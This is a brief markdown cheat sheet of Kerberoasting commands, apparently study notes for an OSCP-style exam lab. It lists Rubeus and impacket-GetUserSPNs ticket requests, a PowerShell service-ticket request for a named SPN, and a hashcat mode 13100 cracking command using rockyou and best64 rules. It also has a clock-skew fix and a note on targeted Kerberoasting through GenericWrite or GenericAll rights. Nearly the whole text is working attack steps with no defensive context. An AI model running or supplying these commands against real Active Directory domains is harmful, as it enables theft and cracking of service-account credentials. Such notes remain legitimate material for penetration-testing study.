# KERBEROASTING
#rubeus 
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

#powershell 
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL/MS02.oscp.exam"
```

#crack 
```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#impacket-GetUserSPNs
```
sudo impacket-GetUserSPNs -request -dc-ip [ip] [domain]/[user]

If we get the error "KRB_AP_ERR_SKEW(Clock skew too great), use: ntpdate [server]" 
```

#targeted_kerberoasting
```
with GenericWrite or GenericAll set an SPN then kerberoast
```